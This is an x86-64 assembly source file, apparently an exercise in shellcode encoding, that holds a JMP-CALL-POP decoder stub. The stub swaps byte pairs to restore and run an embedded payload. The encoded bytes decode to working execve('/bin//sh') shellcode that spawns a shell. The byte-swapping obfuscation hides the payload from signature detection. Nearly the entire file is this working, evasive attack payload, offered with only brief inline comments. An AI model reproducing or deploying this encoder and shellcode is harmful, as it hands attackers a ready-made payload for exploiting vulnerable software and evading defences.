global _start

section .text
_start:

	jmp short call_shellcode

decoder:
	pop rsi			; now contains address of the encoded shellcode
	xor rcx,rcx
	mov cl,16		; 16 = 32/2, shellcode is decoded 2bytewise (swap)

decode:
	;swap first byte (rsi) and second byte (rsi+1)
	mov al,[rsi]		;load first byte to al
	inc rsi
	mov ah,[rsi]		;load second byte to ah
	mov [rsi],al		;load al to second byte
	dec rsi
	mov [rsi],ah		;load ah to first byte


	;mov to next 2 bytes
	add rsi,2		;rsi + 2
	loop decode

	jmp short EncodedShellcode


call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x48,0x50,0xc0,0xbb,0x48,0x62,0x2f,0x6e,0x69,0x2f,0x2f,0x68,0x73,0x48,0x53,0xe7,0x89,0x48,0x50,0xe2,0x89,0x48,0x57,0xe6,0x89,0x83,0x48,0x3b,0xc0,0x05,0x0f,0x90,0x90
	;shellcode length = 32



